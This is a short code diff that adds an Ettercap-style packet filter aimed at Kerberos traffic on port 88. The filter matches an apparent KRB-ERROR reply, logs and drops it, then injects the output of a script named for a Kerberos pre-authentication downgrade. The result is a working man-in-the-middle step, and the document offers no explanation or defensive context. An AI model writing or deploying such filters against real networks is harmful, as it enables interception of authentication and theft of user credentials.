@@ -1,0 +1,7 @@
+if (tcp.src == 88 && search(DATA.data, "\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e")) {
+	msg("downgrade start");
+	log(DATA.data, "/tmp/payload");
+	drop();
+	execinject("/usr/bin/python /tmp/krb5-downgrade-preauth.py /tmp/payload");
+	msg("downgraded stop");
+}
